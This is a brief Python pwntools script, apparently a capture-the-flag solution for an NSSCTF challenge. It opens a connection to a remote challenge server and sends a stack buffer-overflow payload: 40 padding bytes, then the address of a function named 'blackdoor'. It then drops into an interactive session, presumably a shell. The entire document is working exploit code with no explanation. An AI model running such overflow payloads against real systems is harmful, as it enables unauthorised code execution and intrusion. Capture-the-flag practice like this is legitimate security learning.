from pwn import *

p=remote('node5.anna.nssctf.cn',20540)
blackdoor_addr=0x401257
payload=b'a'*40+p64(blackdoor_addr)
p.sendline(payload)
p.interactive()
